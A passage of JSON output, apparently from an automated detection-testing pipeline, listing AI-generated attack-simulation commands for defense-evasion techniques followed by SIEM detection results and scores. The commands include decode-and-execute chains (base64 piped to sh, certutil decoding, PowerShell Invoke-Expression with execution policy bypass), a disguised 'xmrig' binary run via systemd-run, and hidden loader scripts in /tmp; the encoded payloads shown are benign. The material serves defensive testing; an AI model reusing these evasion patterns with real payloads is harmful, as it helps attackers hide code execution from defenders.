      "id": "69d9848e-33fa-4947-a298-eabeb3e2dad0",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "find /tmp -name \"payload.sh\" -exec sh {} \\;",
      "description": "Intermediate technique using 'find' -exec to proxy execution of a script via a trusted binary.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "If /tmp/payload.sh exists, it will be executed via find; otherwise, no action occurs.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.542792",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
      "id": "190ef91c-6b61-490d-b859-4b369c24b4a0",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo '/bin/sleep 5' > /tmp/xmrig && chmod +x /tmp/xmrig && systemd-run --unit=test-svc /tmp/xmrig",
      "description": "Advanced technique using systemd-run (a signed system binary) to execute a disguised binary (xmrig), simulating malware execution via proxy.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Runs a short sleep command via systemd-run, simulating execution of a malicious binary under a trusted service runner.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.542792",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
      "id": "1a3994b8-b997-43df-9fbb-65b9c21bfc7d",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "echo \"ZWNobyBUaGlzIGlzIGEgdGVzdCBvYmZ1c2NhdGVkIGNvbW1hbmQu\" | certutil.exe -decode - %TEMP%\\stage1.txt",
      "description": "Decode a Base64-encoded benign string using certutil, simulating initial stage of obfuscated payload delivery.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a text file in %TEMP% with the decoded content: 'echo This is a test obfuscated command.'",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.268998",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    },
    {
      "id": "6c5d1893-9943-4b88-8362-9faf5c846868",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"\"\"ZXhwb3J0LWNvbnRlbnQgJyUxMjM0NSU1NDMyMScgPiAlVEVNUCUlXFx0bXAudHh0\"\" | certutil.exe -decode - %TEMP%\\decode.ps1; powershell -ExecutionPolicy Bypass -File %TEMP%\\decode.ps1 -ErrorAction SilentlyContinue\"",
      "description": "Decode and execute a double-encoded PowerShell script using certutil and PowerShell, simulating multi-stage obfuscation.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a Base64 string into a PowerShell script that writes a placeholder value to a temp file, then executes it silently.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.268998",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    },
    {
      "id": "f8a6ed33-1d47-423d-bebd-7fba91bbd04e",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"$s = 'YQBlAGMAaABvACAAdABoAGkAcwAgAGkAcwAgAGEAIAB0AGUAcwB0AA=='; $p = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($s)); Invoke-Expression $p\"",
      "description": "Execute a Base64-encoded Unicode PowerShell command that outputs a test message, simulating execution of obfuscated code.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Outputs the message 'echo this is a test' to the console via obfuscated execution, no files written.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.268998",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    },
    {
      "id": "53e31d02-5fef-4371-b8a7-8f50c21487e7",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'ZWNobyBOb3QgYSBtYWxpY2lvdXMgcGF5bG9hZAo=' | base64 -d | sh",
      "description": "Decodes a base64-encoded string and executes it via shell to simulate obfuscated command execution",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs 'echo Not a malicious payload' when decoded and executed; demonstrates simple obfuscation via base64 encoding",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.578120",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    },
    {
      "id": "9852ef80-61a3-4ad1-bfe3-83856ba0aca7",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mkdir -p /tmp/.cache && echo 'dG91Y2ggLmJlaGF2aW9yLnR4dA==' | base64 -d > /tmp/.cache/.loader.sh && chmod +x /tmp/.cache/.loader.sh && /tmp/.cache/.loader.sh",
      "description": "Creates a hidden directory, writes a base64-decoded script to simulate obfuscated file storage, and executes it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a hidden script in /tmp/.cache that creates a test file '.behavior.txt'; simulates stealthy obfuscated file usage",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.578120",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    },
    {
      "id": "ae881712-87b1-437c-9a25-80bbf31846e4",
      "ttp_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_id": "9fc45b4a-9efb-4911-bd0f-d34ec6922963",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'IyEvYmluL3NoCmVjaG8gIk9iZnVzY2F0ZWQgc2hlbGwgc2NyaXB0IHRlc3Qi' | base64 -d > $TMP/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1) && sh $TMP/*",
      "description": "Writes a base64-encoded obfuscated script to a randomly named file in $TMP and executes it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a randomly named script file containing a benign message and executes it; demonstrates dynamic naming and encoding to evade detection",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.578120",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.66,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "e517e09c-4f2d-4f17-9b63-fbd415cb1f4b",
      "ttp_id": "T1046",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 360.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f77bc85e-adc4-4a3e-8868-68d988170ddf",
      "ttp_id": "T1486",
      "detected": true,
      "events_found": 87,
      "query_time_ms": 565.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c8d3e23d-cc4f-4325-aad6-8a7b103efb8e",
      "ttp_id": "T1566",
      "detected": true,
      "events_found": 71,
      "query_time_ms": 594.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "93612f8c-dc92-45d7-8dfe-fa60428bf167",
      "ttp_id": "T1059",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 534.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "99490971-85c7-4ee9-bcbc-d2d4c592380b",
      "ttp_id": "T1083",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 667.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "52abec45-d4a0-44e7-9225-b0c4a3233c02",
      "ttp_id": "T1190",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 367.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c135eb32-00e6-4c12-b649-e2b53c1b1352",
      "ttp_id": "T1547.001",
      "detected": true,
      "events_found": 77,
      "query_time_ms": 401.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "b28e47f5-e2f4-459d-b7d8-6bcee9507180",
      "ttp_id": "T1218",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 1282.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "80cef4a3-318c-417e-8683-02760c5a4723",
      "ttp_id": "T1027",
      "detected": false,
      "events_found": 0,
      "query_time_ms": 1071.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 4,
    "false_positives": 0,
    "false_negatives": 5,
    "precision": 1.0,
    "detection_rate": 0.4444444444444444,
    "f1_score": 0.6153846153846153
  },
  "iterations": 1,
  "final_score": 0.5644444444444444,
  "final_report": {
    "total_ttps": 12,
    "optimized_ttps": 9,
    "generated_rules": 9,
    "generated_attacks": 52,
    "timestamp": "2025-12-28T16:14:02.725505"
  },
  "timestamp": "2025-12-28T16:14:02.729435",
  "benchmark_metrics": {
    "duration_s": 546.0442163944244,
    "quality_score": 0.6369524048935815
  }
}